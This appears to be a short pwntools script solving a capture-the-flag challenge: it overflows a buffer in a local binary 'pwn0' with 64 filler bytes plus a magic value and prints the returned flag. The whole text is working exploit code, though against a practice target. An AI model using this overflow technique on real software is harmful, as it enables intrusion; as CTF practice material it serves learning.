from pwn import *

context.binary = "./pwn0"

p = process()
p.sendline(b"A" * 64 + b"H!gh")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
